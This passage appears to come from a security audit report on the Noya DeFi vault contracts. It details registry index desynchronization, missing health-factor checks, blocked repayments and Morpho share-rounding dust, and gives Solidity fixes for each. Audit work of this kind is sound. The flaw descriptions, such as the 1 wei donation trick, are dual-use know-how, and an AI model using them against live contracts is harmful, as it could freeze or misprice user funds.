   - `ISilo.repay(rToken, amount)` caps the actual token pull (`repaidAmount`) at the borrower's current debt. When `repay` is called with `amount` exceeding the exact accrued debt (or when an external actor transfers `1 wei` of `rToken` to `SiloConnector` before repayment), `IERC20(rToken).balanceOf(address(this))` remains non-zero after `silo.repay(rToken, amount)`, setting `remove = false`.
   - If `rToken` was not currently registered as a holding position on `SiloConnector` (`positionIndex == 0`, such as when `rToken` was previously swapped away and flash-loaned back for repayment), `_updateTokenInRegistry(rToken)` attempts to add a new holding position (`remove = false`). If the vault is at `maxNumHoldingPositions` or if `rToken`'s token position blueprint (`positionId`) is not enabled in `vault.trustedPositionsBP`, `registry.updateHoldingPosition` reverts (`TooManyPositions` or `InvalidPosition`), blocking the vault from repaying its Silo debt.
   - Even when `IERC20(rToken).balanceOf(address(this)) == 0` (`remove = true`) and `positionIndex > 0`, `Registry.updateHoldingPosition` enforces `if (!vault.trustedPositionsBP[_positionId].isEnabled) revert InvalidPosition(_positionId);` (line 344) prior to checking `if (removePosition)`. If governance disables `rToken` in `trustedPositionsBP` to deprecate the asset, `SiloConnector.repay` reverts when trying to remove the `rToken` holding position.

2. **Balance-Driven Lifecycle and Indexing Desynchronization:**
   - When `positionIndex > 0` and the manager repays the debt expecting the `rToken` holding position to be removed, any dust remaining from `silo.repay` capping `repaidAmount` (or a `1 wei` donation to `SiloConnector`) causes `IERC20(rToken).balanceOf(address(this)) == 0` to evaluate to `false`, leaving a stale holding position in `vault.holdingPositions`.
   - Conversely, when `remove == true` and `positionIndex < vault.holdingPositions.length - 1`, `Registry.updateHoldingPosition` moves the last element into `positionIndex` and updates `vault.isPositionUsed` keyed by `calculatorConnector` (`accountingManager` for token positions) instead of `ownerConnector` (`msg.sender`), desynchronizing `getHoldingPositionIndex` for the moved position.

findings.remediation:
In `SiloConnector.repay`, bound the repayment approval/amount or revoke any leftover allowance if `repaidAmount < amount`, and ensure token registry synchronization tolerates dust balances (`<= DUST_LEVEL`) or avoids reverting debt repayment when `rToken` cannot be newly registered as a holding position:

```solidity
    function repay(address siloToken, address rToken, uint256 amount) external onlyManager nonReentrant {
        ISilo silo = ISilo(siloRepository.getSilo(siloToken));
        _approveOperations(rToken, address(silo), amount);
        (uint256 repaidAmount,) = silo.repay(rToken, amount);
        if (repaidAmount < amount) {
            _revokeApproval(rToken, address(silo));
        }
        _updateTokenInRegistry(rToken, IERC20(rToken).balanceOf(address(this)) <= DUST_LEVEL);
        if (!SolvencyV2.isSolvent(silo, address(this), minimumHealthFactor)) {
            revert IConnector_LowHealthFactor(0);
        }
        emit Repay(siloToken, rToken, amount);
    }
```

Remove the post-repayment solvency requirement. Apply solvency checks only to risk-increasing operations such as borrowing or withdrawing collateral. If post-repayment health information is operationally useful, calculate it off-chain or through a non-gating monitoring function.

```solidity
function repay(address siloToken, address rToken, uint256 amount) external onlyManager nonReentrant {
    ISilo silo = ISilo(siloRepository.getSilo(siloToken));
    _approveOperations(rToken, address(silo), amount);
    silo.repay(rToken, amount);
    _updateTokenInRegistry(rToken);
    emit Repay(siloToken, rToken, amount);
}
```

Bind the position identity to the concrete `ISilo` contract address (or store the resolved `ISilo` address in `HoldingPI.data` when opening the position and validate/use that address in `_getPositionTVL`, `withdraw`, and `repay`), rather than re-querying the mutable `siloRepository.getSilo(siloToken)` mapping during valuation.

```solidity
    function _getPositionTVL(HoldingPI memory p, address base) public view override returns (uint256 tvl) {
        PositionBP memory bp = registry.getPositionBP(vaultId, p.positionId);
        address siloAddress = p.data.length == 32
            ? abi.decode(p.data, (address))
            : siloRepository.getSilo(abi.decode(bp.data, (address)));
        ISilo silo = ISilo(siloAddress);
        (address[] memory assets, IBaseSilo.AssetStorage[] memory assetsS) = silo.getAssetsWithState();
        uint256 totalDepositAmount = 0;
        uint256 totalBAmount = 0;
        for (uint256 i = 0; i < assets.length; i++) {
            uint256 depositAmount = IERC20(assetsS[i].collateralToken).balanceOf(address(this));
            depositAmount += IERC20(assetsS[i].collateralOnlyToken).balanceOf(address(this));
            uint256 borrowAmount = IERC20(assetsS[i].debtToken).balanceOf(address(this));
            if (depositAmount == 0 && borrowAmount == 0) {
                continue;
            }
            uint256 price = _getValue(assets[i], base, 1e18);
            totalDepositAmount += depositAmount * price / 1e18;
            totalBAmount += borrowAmount * price / 1e18;
        }
        tvl = totalDepositAmount - totalBAmount;
    }
```

findings.technical_details:
In `PositionRegistry`, each vault maintains an array of active holding positions (`vault.holdingPositions`) and a mapping (`vault.isPositionUsed`) from a `holdingPositionId` to the position's index in `vault.holdingPositions`.

When `updateHoldingPosition(uint256 vaultId, bytes32 _positionId, bytes calldata _data, bytes calldata additionalData, bool removePosition)` is invoked by an active connector (`msg.sender`), the position key `holdingPositionId` is computed on line 345 using `msg.sender`:

```solidity
bytes32 holdingPositionId = keccak256(abi.encode(msg.sender, _positionId, _data));
uint256 positionIndex = vault.isPositionUsed[holdingPositionId];
```

When the position does not yet exist (`positionIndex == 0`) and `removePosition == false`, the internal `updateHoldingPosition` function (lines 293–326) records the new index under `holdingPositionId` (line 311) and pushes a new `HoldingPI` struct (lines 312–321) where:
- `calculatorConnector` is set to `vaults[vaultId].trustedPositionsBP[_positionId].calculatorConnector` (line 314), which is the contract responsible for valuing the position.
- `ownerConnector` is set to `msg.sender` (line 315), which is the connector actually holding the position.

For any trusted position configured with `onlyOwner == false` (such as token holding positions where `AccountingManager` is the `calculatorConnector` and individual strategy connectors are the `ownerConnector`), `calculatorConnector` and `ownerConnector` are distinct addresses (`calculatorConnector != ownerConnector`).

However, when removing an existing holding position (`removePosition == true`) located at `positionIndex < vault.holdingPositions.length - 1` (lines 348–363), `updateHoldingPosition` performs a swap-and-pop by moving the last element of `vault.holdingPositions` into `positionIndex` and updating `vault.isPositionUsed` for the moved element (lines 350–357):

```solidity
if (positionIndex < vault.holdingPositions.length - 1) {
    vault.holdingPositions[positionIndex] = vault.holdingPositions[vault.holdingPositions.length - 1];
    vault.isPositionUsed[keccak256(
        abi.encode(
            vault.holdingPositions[positionIndex].calculatorConnector,
            vault.holdingPositions[positionIndex].positionId,
            vault.holdingPositions[positionIndex].data
        )
    )] = positionIndex;
}
vault.holdingPositions.pop();
vault.isPositionUsed[holdingPositionId] = 0;
```

On line 353, the contract mistakenly uses `vault.holdingPositions[positionIndex].calculatorConnector` instead of `vault.holdingPositions[positionIndex].ownerConnector` to recompute the moved position's `holdingPositionId`.

As a result, whenever the last element in `vault.holdingPositions` has `ownerConnector != calculatorConnector` and is swapped into an earlier slot during a removal:
1. Its true mapping entry `vault.isPositionUsed[keccak256(abi.encode(ownerConnector, positionId, data))]` is never updated to `positionIndex` and continues to point to the old tail index `vault.holdingPositions.length` (which is now out of bounds after `pop()`).
2. An unrelated mapping entry `vault.isPositionUsed[keccak256(abi.encode(calculatorConnector, positionId, data))]` is overwritten with `positionIndex`.
3. Subsequent calls by `ownerConnector` to update `additionalData` (line 324) or `positionTimestamp` (line 380) for the moved position will either revert with an out-of-bounds array panic (`Panic(0x32)`) or overwrite a newly pushed position at the old index.
4. Subsequent calls by `ownerConnector` to remove the moved position will read the stale `positionIndex`: if no new positions were added, `positionIndex < vault.holdingPositions.length - 1` evaluates to `false`, causing `vault.holdingPositions.pop()` to remove the wrong position at the end of the array while leaving the actual position permanently stuck at its swapped index in `vault.holdingPositions`.

findings.remediation:
In `PositionRegistry.updateHoldingPosition`, use `ownerConnector` instead of `calculatorConnector` when recomputing the `holdingPositionId` of the swapped position during removal.

```solidity
        if (removePosition) {
            if (positionIndex < vault.holdingPositions.length - 1) {
                vault.holdingPositions[positionIndex] = vault.holdingPositions[vault.holdingPositions.length - 1];
                vault.isPositionUsed[keccak256(
                    abi.encode(
                        vault.holdingPositions[positionIndex].ownerConnector,
                        vault.holdingPositions[positionIndex].positionId,
                        vault.holdingPositions[positionIndex].data
                    )
                )] = positionIndex;
            }
            vault.holdingPositions.pop();
            vault.isPositionUsed[holdingPositionId] = 0;
            emit HoldingPositionUpdated(vaultId, _positionId, _data, additionalData, removePosition, positionIndex);
            return type(uint256).max;
        }
```

Pass `false` instead of `true` for the `removePosition` parameter in `DolomiteConnector.openBorrowPosition`, and check whether default account `0` still holds any market balances so that account `0`'s holding position is removed if emptied.

```solidity
    function openBorrowPosition(uint256 marketId, uint256 _amountWei, uint256 accountId)
        public
        onlyManager
        nonReentrant
    {
        address token = dolomiteMargin.getMarketTokenAddress(marketId);

        if (!registry.isTokenTrusted(vaultId, token, address(this))) {
            revert IConnector_UntrustedToken(token);
        }
        // borrow
        borrowPositionProxy.openBorrowPosition(
            0, accountId, marketId, _amountWei, AccountBalanceHelper.BalanceCheckFlag.None
        );
        registry.updateHoldingPosition(
            vaultId, registry.calculatePositionId(address(this), DOL_POSITION_ID, ""), abi.encode(accountId), "", false
        );
        (uint256[] memory markets,,,) = dolomiteMargin.getAccountBalances(Info(address(this), 0));
        if (markets.length == 0) {
            registry.updateHoldingPosition(
                vaultId, registry.calculatePositionId(address(this), DOL_POSITION_ID, ""), abi.encode(0), "", true
            );
        }
    }
```

Pass `AccountBalanceHelper.BalanceCheckFlag.Both` (or `AccountBalanceHelper.BalanceCheckFlag.From`) to `borrowPositionProxy.openBorrowPosition` so that transferring collateral from default account `0` to `accountId` cannot push account `0` into a negative balance, and validate that the account's health factor meets `minimumHealthFactor` whenever debt is present.

```solidity
    function openBorrowPosition(uint256 marketId, uint256 _amountWei, uint256 accountId)
        public
        onlyManager
        nonReentrant
    {
        address token = dolomiteMargin.getMarketTokenAddress(marketId);

        if (!registry.isTokenTrusted(vaultId, token, address(this))) {
            revert IConnector_UntrustedToken(token);
        }
        // open borrow position by moving collateral from default account 0 to accountId
        borrowPositionProxy.openBorrowPosition(
            0, accountId, marketId, _amountWei, AccountBalanceHelper.BalanceCheckFlag.Both
        );
        _checkHealthFactor(0);
        _checkHealthFactor(accountId);
        registry.updateHoldingPosition(
            vaultId, registry.calculatePositionId(address(this), DOL_POSITION_ID, ""), abi.encode(accountId), "", false
        );
    }
```

findings.technical_details:
In `DolomiteConnector`, each Dolomite sub-account (`0` for the default account and `accountId` for isolated borrow accounts) is tracked as a separate holding position in `PositionRegistry` under `DOL_POSITION_ID` with `abi.encode(accountId)` as the position data. When `AccountingManager.TVL()` calculates the vault's total value locked, `TVLHelper.getTVL` iterates over all registered `holdingPositions` in `PositionRegistry` and calls `DolomiteConnector._getPositionTVL(HoldingPI memory p, address base)` for each registered `accountId`.

In `DolomiteConnector.sol` (lines 77–96):

```solidity
function transferBetweenAccounts(uint256 accountId, uint256 marketId, uint256 _amountWei, bool borrowOrRepay)
    public
    onlyManager
    nonReentrant
{
    address token = dolomiteMargin.getMarketTokenAddress(marketId);

    if (!registry.isTokenTrusted(vaultId, token, address(this))) {
        revert IConnector_UntrustedToken(token);
    }
    if (borrowOrRepay) {
        borrowPositionProxy.transferBetweenAccounts(
            accountId, 0, marketId, _amountWei, AccountBalanceHelper.BalanceCheckFlag.None
        );
    } else {
        borrowPositionProxy.transferBetweenAccounts(
            0, accountId, marketId, _amountWei, AccountBalanceHelper.BalanceCheckFlag.None
        );
    }
}
```

Unlike `deposit`, `withdraw`, `openBorrowPosition`, and `closeBorrowPosition`, `transferBetweenAccounts` never calls `registry.updateHoldingPosition` for either account `0` or `accountId` after moving balances between them:

1. **Untracked Assets in Default Account (`0`):** When a manager deposits into account `0`, moves all collateral into `accountId`, borrows an asset into account `0` via `transferBetweenAccounts(..., true)`, and withdraws the borrowed asset via `withdraw()`, `dolomiteMargin.getAccountBalances(Info(address(this), 0))` returns `markets.length == 0`, causing `withdraw()` (lines 50–55) to remove the `abi.encode(0)` holding position from `PositionRegistry`. When the manager subsequently calls `transferBetweenAccounts(accountId, marketId, _amountWei, true)` to move collateral or newly borrowed funds back from `accountId` to account `0`, `abi.encode(0)` is never re-registered in `PositionRegistry`. All assets sitting in account `0` are completely excluded from `_getPositionTVL` and `AccountingManager.TVL()`.
2. **Untracked Sub-Account (`accountId`) Positions and Stale Empty Positions:** When `transferBetweenAccounts` is used to move funds from account `0` into `accountId` (`borrowOrRepay == false`) or borrow from `accountId` into account `0` (`borrowOrRepay == true`), `abi.encode(accountId)` is not added to `PositionRegistry` (notably, `openBorrowPosition` on line 73 also passes `removePosition = true`, leaving `accountId` unregistered). Furthermore, if a transfer reduces the active markets of either account `0` or `accountId` to zero (`markets.length == 0`), the corresponding holding position is not removed from `PositionRegistry`, leaving stale empty positions consuming slots against `maxNumHoldingPositions`.

findings.remediation:
Update `DolomiteConnector.transferBetweenAccounts` (and ensure `openBorrowPosition` passes `false` when adding `accountId`) to check the market balances of both account `0` and `accountId` and synchronize their holding positions in `PositionRegistry` accordingly:

```solidity
    function transferBetweenAccounts(uint256 accountId, uint256 marketId, uint256 _amountWei, bool borrowOrRepay)
        public
        onlyManager
        nonReentrant
    {
        address token = dolomiteMargin.getMarketTokenAddress(marketId);

        if (!registry.isTokenTrusted(vaultId, token, address(this))) {
            revert IConnector_UntrustedToken(token);
        }
        if (borrowOrRepay) {
            borrowPositionProxy.transferBetweenAccounts(
                accountId, 0, marketId, _amountWei, AccountBalanceHelper.BalanceCheckFlag.None
            );
        } else {
            borrowPositionProxy.transferBetweenAccounts(
                0, accountId, marketId, _amountWei, AccountBalanceHelper.BalanceCheckFlag.None
            );
        }
        bytes32 positionId = registry.calculatePositionId(address(this), DOL_POSITION_ID, "");
        (uint256[] memory markets0,,,) = dolomiteMargin.getAccountBalances(Info(address(this), 0));
        registry.updateHoldingPosition(vaultId, positionId, abi.encode(0), "", markets0.length == 0);

        (uint256[] memory marketsAccount,,,) = dolomiteMargin.getAccountBalances(Info(address(this), accountId));
        registry.updateHoldingPosition(vaultId, positionId, abi.encode(accountId), "", marketsAccount.length == 0);
    }
```

findings.technical_details:
In the Noya architecture, lending connectors inherit from `BaseConnector`, which defines `minimumHealthFactor` (initialized to `MINIMUM_HEALTH_FACTOR = 15e17`) to enforce a mandatory collateralization buffer above the underlying protocol's liquidation threshold whenever borrowing occurs (as implemented in `AaveConnector.borrow` and `CompoundConnector.withdrawOrBorrow`).

In `contracts/connectors/Dolomite.sol`, `DolomiteConnector` manages deposits in default account `0` and isolated borrow positions in sub-accounts identified by `accountId`. Borrowing and repayment are performed via `transferBetweenAccounts`:

```solidity
function transferBetweenAccounts(uint256 accountId, uint256 marketId, uint256 _amountWei, bool borrowOrRepay)
    public
    onlyManager
    nonReentrant
{
    address token = dolomiteMargin.getMarketTokenAddress(marketId);

    if (!registry.isTokenTrusted(vaultId, token, address(this))) {
        revert IConnector_UntrustedToken(token);
    }
    if (borrowOrRepay) {
        borrowPositionProxy.transferBetweenAccounts(
            accountId, 0, marketId, _amountWei, AccountBalanceHelper.BalanceCheckFlag.None
        );
    } else {
        borrowPositionProxy.transferBetweenAccounts(
            0, accountId, marketId, _amountWei, AccountBalanceHelper.BalanceCheckFlag.None
        );
    }
}
```

This implementation fails to enforce cross-account lending invariants in two ways:

1. **Missing `minimumHealthFactor` Enforcement on Borrows (`borrowOrRepay == true`):**
   When `borrowOrRepay` is `true`, `_amountWei` of `marketId` is transferred from `accountId` to default account `0`, driving `accountId`'s balance negative to create or increase debt. Unlike `AaveConnector.borrow` and `CompoundConnector.withdrawOrBorrow`, `transferBetweenAccounts` never queries `dolomiteMargin` (e.g., via `getAdjustedAccountValues` or `getAccountValues` and `getMarginRatio`) to verify that the resulting health factor of `accountId` remains at or above `minimumHealthFactor`, nor does it call `_updateTokenInRegistry(token)` or ensure `accountId != 0`. Consequently, positions can be leveraged right up to Dolomite's liquidation boundary, violating the vault's configured risk parameters.

2. **Unintended Debt Creation via `BalanceCheckFlag.None` on Repayments (`borrowOrRepay == false`):**
   When `borrowOrRepay` is `false`, `_amountWei` is transferred from default account `0` to `accountId` to repay debt. Because `AccountBalanceHelper.BalanceCheckFlag.None` is passed instead of `AccountBalanceHelper.BalanceCheckFlag.From` (or `Both`), Dolomite does not verify that account `0`'s balance remains non-negative after the transfer. If `_amountWei` exceeds the supplied balance of `marketId` in account `0`, account `0`'s balance becomes negative, unintentionally opening a borrow position in default account `0` against all default-account collateral.

findings.remediation:
Enforce `accountId != 0`, use `AccountBalanceHelper.BalanceCheckFlag.From` (or `Both`) when transferring out of account `0` so the default account cannot go negative, and validate that the borrow account's health factor remains at or above `minimumHealthFactor`:

```solidity
    function transferBetweenAccounts(uint256 accountId, uint256 marketId, uint256 _amountWei, bool borrowOrRepay)
        public
        onlyManager
        nonReentrant
    {
        if (accountId == 0) {
            revert IConnector_InvalidInput();
        }
        address token = dolomiteMargin.getMarketTokenAddress(marketId);

        if (!registry.isTokenTrusted(vaultId, token, address(this))) {
            revert IConnector_UntrustedToken(token);
        }
        if (borrowOrRepay) {
            borrowPositionProxy.transferBetweenAccounts(
                accountId, 0, marketId, _amountWei, AccountBalanceHelper.BalanceCheckFlag.To
            );
            uint256 healthFactor = getAccountHealthFactor(accountId);
            if (healthFactor < minimumHealthFactor) {
                revert IConnector_LowHealthFactor(healthFactor);
            }
        } else {
            borrowPositionProxy.transferBetweenAccounts(
                0, accountId, marketId, _amountWei, AccountBalanceHelper.BalanceCheckFlag.From
            );
        }
    }

    function getAccountHealthFactor(uint256 accountId) public view returns (uint256) {
        (Value memory supplyValue, Value memory borrowValue) =
            dolomiteMargin.getAdjustedAccountValues(Info(address(this), accountId));
        if (borrowValue.value == 0) {
            return type(uint256).max;
        }
        Decimal.D256 memory marginRatio = dolomiteMargin.getMarginRatio();
        uint256 minCollateralValue = (borrowValue.value * (1e18 + marginRatio.value)) / 1e18;
        return (supplyValue.value * 1e18) / minCollateralValue;
    }
```

findings.technical_details:
In `PositionRegistry.updateHoldingPosition(uint256, bytes32, bytes, bytes, bool)` (`contracts/accountingManager/Registry.sol`), holding position identifiers in `vault.isPositionUsed` are keyed by the owning connector (`msg.sender`), the `_positionId`, and `_data`:

```solidity
bytes32 holdingPositionId = keccak256(abi.encode(msg.sender, _positionId, _data));
```

When a new holding position is inserted into `vault.holdingPositions` (lines 311–321), the stored `HoldingPI` struct records two potentially distinct connector addresses:
- `calculatorConnector`: `vaults[vaultId].trustedPositionsBP[_positionId].calculatorConnector`
- `ownerConnector`: `msg.sender`

For shared position types (`onlyOwner == false`)—most notably ERC-20 token holdings (`positionTypeId == 0`) managed via `BaseConnector._updateTokenInRegistry` (lines 135–146)—`calculatorConnector` is the vault's `accountingManager`, whereas `ownerConnector` is the connector contract holding the token (`address(this)`).

In `MorphoBlueConnector.withdraw` (`contracts/connectors/MorphoBlueConnector.sol`, lines 58–73), after withdrawing supplied assets or collateral, the connector checks whether the Morpho position is empty and removes it from the registry (lines 66–69):

```solidity
Position memory p = morphoBlue.position(id, address(this));
if (p.collateral == 0 && p.supplyShares == 0) {
    registry.updateHoldingPosition(
        vaultId, registry.calculatePositionId(address(this), MORPHO_POSITION_ID, abi.encode(id)), "", "", true
    );
}
```

Inside `PositionRegistry.updateHoldingPosition` (lines 348–360), when `removePosition == true` and the removed position is not the last element of `vault.holdingPositions` (`positionIndex < vault.holdingPositions.length - 1`), the last element of `vault.holdingPositions` is moved into `vault.holdingPositions[positionIndex]`. However, `PositionRegistry` updates `vault.isPositionUsed` for the moved element using `calculatorConnector` instead of `ownerConnector` (lines 351–357):

```solidity
vault.holdingPositions[positionIndex] = vault.holdingPositions[vault.holdingPositions.length - 1];
vault.isPositionUsed[keccak256(
    abi.encode(
        vault.holdingPositions[positionIndex].calculatorConnector,
        vault.holdingPositions[positionIndex].positionId,
        vault.holdingPositions[positionIndex].data
    )
)] = positionIndex;
```

Whenever the last element in `vault.holdingPositions` has `calculatorConnector != ownerConnector` (such as any token holding position registered by `MorphoBlueConnector` or another connector):
1. The mapping entry under the moved position's true key `keccak256(abi.encode(ownerConnector, positionId, data))` is never updated and continues pointing to the old index `vault.holdingPositions.length` (which is now out of bounds after `vault.holdingPositions.pop()`).
2. A bogus key `keccak256(abi.encode(calculatorConnector, positionId, data))` is set to `positionIndex`.
3. When the moved position is later updated or removed (for instance, via `_updateTokenInRegistry`), `getHoldingPositionIndex` looks up the stale index via `ownerConnector`. If the stale index equals or exceeds `vault.holdingPositions.length`, removing it either pops an unrelated position from the end of `vault.holdingPositions` (leaving the moved position permanently stuck in `vault.holdingPositions`) or reverts with an out-of-bounds array access panic when trying to overwrite `vault.holdingPositions[positionIndex]`.

findings.remediation:
In `PositionRegistry.updateHoldingPosition`, use `ownerConnector` instead of `calculatorConnector` when updating `vault.isPositionUsed` for the swapped position during removal:

```solidity
        if (removePosition) {
            if (positionIndex < vault.holdingPositions.length - 1) {
                vault.holdingPositions[positionIndex] = vault.holdingPositions[vault.holdingPositions.length - 1];
                vault.isPositionUsed[keccak256(
                    abi.encode(
                        vault.holdingPositions[positionIndex].ownerConnector,
                        vault.holdingPositions[positionIndex].positionId,
                        vault.holdingPositions[positionIndex].data
                    )
                )] = positionIndex;
            }
            vault.holdingPositions.pop();
            vault.isPositionUsed[holdingPositionId] = 0;
            emit HoldingPositionUpdated(vaultId, _positionId, _data, additionalData, removePosition, positionIndex);
            return type(uint256).max;
        }
```

findings.technical_details:
In `BaseConnector._updateTokenInRegistry` (`contracts/helpers/BaseConnector.sol`, lines 135–145), a connector tracks its ERC20 token holdings in `PositionRegistry` using position type `0` calculated under the vault's `accountingManager`:

```solidity
bytes32 positionId = registry.calculatePositionId(accountingManager, 0, abi.encode(token));
uint256 positionIndex =
    registry.getHoldingPositionIndex(vaultId, positionId, address(this), abi.encode(address(this)));
if ((positionIndex == 0 && !remove) || (positionIndex > 0 && remove)) {
    emit UpdateTokenInRegistry(token, remove);
    registry.updateHoldingPosition(vaultId, positionId, abi.encode(address(this)), "", remove);
}
```

When `registry.updateHoldingPosition` (`contracts/accountingManager/Registry.sol`, lines 335–366) is called by `BaseConnector` (`msg.sender == address(this)`):

1. **Position Identity on Registration and Lookup:**
   Both `PositionRegistry.getHoldingPositionIndex` (line 399) and `PositionRegistry.updateHoldingPosition` (line 345) derive `holdingPositionId` using the calling connector (`msg.sender` / `ownerConnector`):
   ```solidity
   bytes32 holdingPositionId = keccak256(abi.encode(msg.sender, _positionId, _data));
   ```
   When a new token position is added (`index == 0`, lines 304–323), `vault.isPositionUsed[holdingPositionId]` records the new index in `vault.holdingPositions`, and the pushed `HoldingPI` struct stores:
   - `calculatorConnector`: `vaults[vaultId].trustedPositionsBP[_positionId].calculatorConnector` (which is `accountingManager` for token positions).
   - `ownerConnector`: `msg.sender` (which is `address(this)`, the `BaseConnector` instance).

2. **Inconsistent Position Identity on Swap-and-Pop Removal:**
   When any holding position at `positionIndex < vault.holdingPositions.length - 1` is removed (`removePosition == true`, lines 348–362), the last element of `vault.holdingPositions` is moved into `positionIndex`. However, `PositionRegistry.updateHoldingPosition` updates `vault.isPositionUsed` for the moved element using `calculatorConnector` instead of `ownerConnector` (lines 351–357):
   ```solidity
   vault.holdingPositions[positionIndex] = vault.holdingPositions[vault.holdingPositions.length - 1];
   vault.isPositionUsed[keccak256(
       abi.encode(
           vault.holdingPositions[positionIndex].calculatorConnector,
           vault.holdingPositions[positionIndex].positionId,
           vault.holdingPositions[positionIndex].data
       )
   )] = positionIndex;
   ```

Because `calculatorConnector` (`accountingManager`) differs from `ownerConnector` (`BaseConnector`) for all token positions registered via `BaseConnector._updateTokenInRegistry`, the mapping entry under the actual key `keccak256(abi.encode(ownerConnector, positionId, data))` is never updated when that token position is relocated during a swap-and-pop removal.

Consequently:
- `vault.isPositionUsed[holdingPositionId]` retains its stale, pre-swap index.
- When the connector's balance of `token` later reaches zero and `_updateTokenInRegistry(token, true)` is invoked, `PositionRegistry.updateHoldingPosition` reads the stale `positionIndex`. If another position now occupies that index (or if the array has shrunk), the wrong holding position is overwritten or popped from `vault.holdingPositions`, while the zero-balance token position remains stuck in `vault.holdingPositions`.
- Conversely, if the connector's balance of `token` later becomes non-zero again before removal, `getHoldingPositionIndex` still returns the non-zero stale index (`positionIndex > 0`), causing `_updateTokenInRegistry(token, false)` to skip registering the token position altogether.

findings.remediation:
In `PositionRegistry.updateHoldingPosition` (`contracts/accountingManager/Registry.sol`), use `ownerConnector` instead of `calculatorConnector` when updating `vault.isPositionUsed` for the swapped holding position so that it matches the key derivation used during registration and lookup:

```solidity
        if (removePosition) {
            if (positionIndex < vault.holdingPositions.length - 1) {
                vault.holdingPositions[positionIndex] = vault.holdingPositions[vault.holdingPositions.length - 1];
                vault.isPositionUsed[keccak256(
                    abi.encode(
                        vault.holdingPositions[positionIndex].ownerConnector,
                        vault.holdingPositions[positionIndex].positionId,
                        vault.holdingPositions[positionIndex].data
                    )
                )] = positionIndex;
            }
            vault.holdingPositions.pop();
            vault.isPositionUsed[holdingPositionId] = 0;
            emit HoldingPositionUpdated(vaultId, _positionId, _data, additionalData, removePosition, positionIndex);
            return type(uint256).max;
        }
```

findings.technical_details:
In `contracts/connectors/MorphoBlueConnector.sol`, `withdraw` handles withdrawals of both supplied loan tokens (`sOrC == true`) and collateral tokens (`sOrC == false`):

```solidity
function withdraw(uint256 amount, Id id, bool sOrC) external onlyManager nonReentrant {
    MarketParams memory params = morphoBlue.idToMarketParams(id);
    if (sOrC) {
        morphoBlue.withdraw(params, amount, 0, address(this), address(this));
    } else {
        morphoBlue.withdrawCollateral(params, amount, address(this), address(this));
    }
    Position memory p = morphoBlue.position(id, address(this));
    if (p.collateral == 0 && p.supplyShares == 0) {
        registry.updateHoldingPosition(
            vaultId, registry.calculatePositionId(address(this), MORPHO_POSITION_ID, abi.encode(id)), "", "", true
        );
    }
    ...
}
```

When `sOrC` is `true`, line 61 invokes `morphoBlue.withdraw(params, amount, 0, address(this), address(this))`, passing `amount` as the `assets` parameter and `0` as the `shares` parameter.

In Morpho Blue (`IMorpho` and `SharesMathLib`), user supply balances are tracked internally as shares (`Position.supplyShares`) using virtual shares (`VIRTUAL_SHARES = 1e6`) and virtual assets (`VIRTUAL_ASSETS = 1`). When `withdraw` is called with `assets > 0` and `shares == 0`:
1. Morpho Blue first accrues market interest up to `block.timestamp`, updating `totalSupplyAssets` and `totalSupplyShares`.
2. Morpho Blue converts the requested `assets` into shares rounded up via `SharesMathLib.toSharesUp`:
   $$\text{sharesWithdrawn} = \left\lceil \frac{\text{assets} \times (\text{totalSupplyShares} + 10^6)}{\text{totalSupplyAssets} + 1} \right\rceil$$
3. Morpho Blue subtracts `sharesWithdrawn` from `position[id][onBehalf].supplyShares`, reverting on underflow if `sharesWithdrawn > p.supplyShares`.

This creates two closely related failure modes when the vault manager attempts to close out a supply position:
1. **Timestamp-dependent interest accrual and underflow reverts:** If the manager computes the connector's underlying asset balance off-chain and submits `withdraw(amount, id, true)`, any discrepancy or rounding up in `toSharesUp(amount)` causes `sharesWithdrawn > p.supplyShares`, reverting the transaction. As noted in `IMorpho.sol` (lines 159–160):
   > `@dev It is advised to use the shares input when withdrawing the full position to avoid reverts due to conversion roundings between shares and assets.`
2. **Rounding-induced residual `supplyShares`:** Because `totalSupplyShares + 1e6` is approximately $10^6$ times larger than `totalSupplyAssets + 1`, each 1 wei increment in `assets` changes `toSharesUp(assets)` by roughly $10^6$ shares (adjusted by the exchange rate). Once interest accrues and `p.supplyShares` is no longer an exact multiple of the share-per-asset ratio, there is no integer `amount` of assets for which `toSharesUp(amount) == p.supplyShares`:
   - Passing $A = \text{toAssetsDown}(p.\text{supplyShares})$ burns $\text{toSharesUp}(A) < p.\text{supplyShares}$, leaving residual dust shares ($0 < p.\text{supplyShares} < 10^6$) in Morpho Blue.
   - Passing $A + 1$ results in $\text{toSharesUp}(A + 1) > p.\text{supplyShares}$, which reverts on underflow.

Because `p.supplyShares` cannot be reduced to `0`, the condition on line 66 (`if (p.collateral == 0 && p.supplyShares == 0)`) evaluates to `false`. Consequently, `registry.updateHoldingPosition(..., true)` on lines 67–69 is never executed, and the holding position cannot be removed from `PositionRegistry`.

findings.remediation:
Update `MorphoBlueConnector.withdraw` so that when `sOrC` is `true`, the caller passes the number of `supplyShares` to burn (or converts/caps to shares when withdrawing full balance) and passes `shares` to `morphoBlue.withdraw`:

```solidity
    function withdraw(uint256 amount, Id id, bool sOrC) external onlyManager nonReentrant {
        MarketParams memory params = morphoBlue.idToMarketParams(id);
        if (sOrC) {
            morphoBlue.withdraw(params, 0, amount, address(this), address(this));
        } else {
            morphoBlue.withdrawCollateral(params, amount, address(this), address(this));
        }
        Position memory p = morphoBlue.position(id, address(this));
        if (p.collateral == 0 && p.supplyShares == 0) {
            registry.updateHoldingPosition(
                vaultId, registry.calculatePositionId(address(this), MORPHO_POSITION_ID, abi.encode(id)), "", "", true
            );
        }
        _updateTokenInRegistry(sOrC ? params.loanToken : params.collateralToken);
        emit Withdraw(amount, id, sOrC);
    }
```

Alternatively, if `amount` is kept in asset units, check whether the requested `amount` is greater than or equal to the total withdrawable assets (`uint256(p.supplyShares).toAssetsDown(market.totalSupplyAssets, market.totalSupplyShares)`) or `type(uint256).max`, and in that case call `morphoBlue.withdraw(params, 0, p.supplyShares, address(this), address(this))`.

findings.technical_details:
In `BaseConnector` (`contracts/helpers/BaseConnector.sol`), the protocol establishes an application-level collateralization safety buffer via `minimumHealthFactor` (initialized to `MINIMUM_HEALTH_FACTOR = 15e17`, i.e., 1.5x of the liquidation threshold, and configurable upward by the maintainer via `updateMinimumHealthFactor`). As documented in `BaseConnector`:

> `for the connectors that borrowing is allowed, the health factor should be higher than this value (so we keep a safe margin)`

`MorphoBlueConnector.borrow` (lines 80–88) enforces this invariant whenever debt is increased:

```solidity
if (getHealthFactor(id, morphoBlue.market(id)) < minimumHealthFactor) {
    revert IConnector_LowHealthFactor(getHealthFactor(id, morphoBlue.market(id)));
}
```

